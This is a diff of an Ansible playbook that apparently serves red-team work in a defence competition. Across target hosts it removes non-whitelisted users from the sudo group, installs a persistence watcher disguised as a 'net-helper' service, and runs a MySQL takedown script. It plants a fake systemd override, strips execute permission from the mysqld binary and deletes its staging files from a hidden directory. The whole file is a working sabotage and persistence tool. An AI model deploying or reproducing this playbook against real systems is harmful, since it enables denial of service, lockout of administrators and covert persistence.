@@ -1,6 +1,6 @@
 ---
 - name: Deploy MySQL Suppression to All Targets
-  hosts: ubuntu_vms
+  hosts: mysql_targets
   become: true
   gather_facts: true
 
@@ -10,12 +10,12 @@
       - scoring
       - cia
       - kgb
-    deploy_dir: /tmp/.deploy
     log_path: /var/lib/.cache/mysql_watch.log
+    deploy_dir: /tmp/.deploy
 
   tasks:
 
-    # ── Sanity check ──────────────────────────────────
+    # ── Sanity Check ──────────────────────────────────
     - name: Confirm we are on Ubuntu 22.04
       assert:
         that:
@@ -25,19 +25,19 @@
         success_msg: "Confirmed Ubuntu 22.04 on {{ inventory_hostname }}"
 
     # ── Prep ──────────────────────────────────────────
-    - name: Create deploy staging directory
-      file:
-        path: "{{ deploy_dir }}"
-        state: directory
-        mode: '0700'
-
     - name: Create log directory
       file:
         path: /var/lib/.cache
         state: directory
         mode: '0777'
 
-    # ── Upload scripts ────────────────────────────────
+    - name: Create staging directory
+      file:
+        path: "{{ deploy_dir }}"
+        state: directory
+        mode: '0700'
+
+    # ── Upload Scripts ────────────────────────────────
     - name: Upload watcher installer
       copy:
         src: install_watcher.sh
@@ -50,7 +50,7 @@
         dest: "{{ deploy_dir }}/mysql_takedown.sh"
         mode: '0700'
 
-    # ── Whitelist enforcement ─────────────────────────
+    # ── Whitelist Enforcement ─────────────────────────
     - name: Get current sudo group members
       command: getent group sudo
       register: sudo_group
@@ -76,7 +76,7 @@
       loop: "{{ sudo_removal.results }}"
       when: item.rc is defined and item.rc == 0
 
-    # ── Install watcher (persistence) ─────────────────
+    # ── Install Watcher ───────────────────────────────
     - name: Run watcher installer
       command: bash {{ deploy_dir }}/install_watcher.sh
       register: watcher_install
@@ -85,8 +85,8 @@
       debug:
         msg: "{{ watcher_install.stdout_lines }}"
 
-    # ── Verify watcher is running ─────────────────────
-    - name: Confirm net-helper service is active
+    # ── Verify Watcher ────────────────────────────────
+    - name: Check net-helper service status
       systemd:
         name: net-helper
       register: watcher_status
@@ -97,47 +97,78 @@
         fail_msg: "WARNING — watcher not running on {{ inventory_hostname }}"
         success_msg: "Watcher confirmed running on {{ inventory_hostname }}"
 
-    # ── MySQL takedown ────────────────────────────────
+    # ── Run Takedown ──────────────────────────────────
     - name: Run MySQL takedown
       command: bash {{ deploy_dir }}/mysql_takedown.sh
       register: takedown_result
 
-    - name: Confirm MySQL is masked
+    - name: Show takedown output
+      debug:
+        msg: "{{ takedown_result.stdout_lines }}"
+
+    # ── Verify MySQL Is Down ──────────────────────────
+    - name: Check MySQL service status
       command: systemctl is-active mysql
       register: mysql_status
       failed_when: false
       changed_when: false
 
-    - name: Report MySQL status
-      debug:
-        msg: >
-          {{ inventory_hostname }} MySQL status:
-          {{ mysql_status.stdout }}
-          (should be 'inactive' or 'failed')
+    - name: Assert MySQL is not running
+      assert:
+        that: mysql_status.stdout != "active"
+        fail_msg: "WARNING — MySQL still running on {{ inventory_hostname }}"
+        success_msg: "Confirmed MySQL is down on {{ inventory_hostname }}"
 
-    # ── Verify port 3306 is closed ────────────────────
-    - name: Check port 3306 is not listening
+    # ── Verify Port 3306 Is Closed ────────────────────
+    - name: Check port 3306
       command: ss -tlnp
       register: port_check
       changed_when: false
 
-    - name: Assert 3306 is not open
+    - name: Assert port 3306 is not open
       assert:
         that: "'3306' not in port_check.stdout"
         fail_msg: "WARNING — port 3306 still open on {{ inventory_hostname }}"
         success_msg: "Confirmed port 3306 closed on {{ inventory_hostname }}"
 
-    # ── Cleanup staging files ─────────────────────────
+    # ── Verify Fake Override Is In Place ─────────────
+    - name: Check fake override exists
+      stat:
+        path: /etc/systemd/system/mysql.service.d/override.conf
+      register: override_check
+
+    - name: Assert fake override is planted
+      assert:
+        that: override_check.stat.exists
+        fail_msg: "WARNING — fake override missing on {{ inventory_hostname }}"
+        success_msg: "Confirmed fake override planted on {{ inventory_hostname }}"
+
+    # ── Verify Binary Permissions ─────────────────────
+    - name: Check mysqld binary permissions
+      stat:
+        path: /usr/sbin/mysqld
+      register: binary_check
+
+    - name: Assert binary is not executable
+      assert:
+        that: not binary_check.stat.executable
+        fail_msg: "WARNING — mysqld binary still executable on {{ inventory_hostname }}"
+        success_msg: "Confirmed mysqld binary permissions removed on {{ inventory_hostname }}"
+
+    # ── Cleanup ───────────────────────────────────────
     - name: Remove staging directory
       file:
         path: "{{ deploy_dir }}"
         state: absent
 
-    # ── Final report ──────────────────────────────────
+    # ── Final Report ──────────────────────────────────
     - name: Final status summary
       debug:
         msg:
-          - "Host     : {{ inventory_hostname }}"
-          - "Watcher  : {{ watcher_status.status.ActiveState }}"
-          - "MySQL    : {{ mysql_status.stdout }}"
-          - "Port 3306: {{ '3306' not in port_check.stdout }}"
+          - "===== SUMMARY: {{ inventory_hostname }} ====="
+          - "Watcher      : {{ watcher_status.status.ActiveState }}"
+          - "MySQL status : {{ mysql_status.stdout }}"
+          - "Port 3306    : {{ '3306' not in port_check.stdout }}"
+          - "Fake override: {{ override_check.stat.exists }}"
+          - "Binary locked: {{ not binary_check.stat.executable }}"
+          - "============================================="
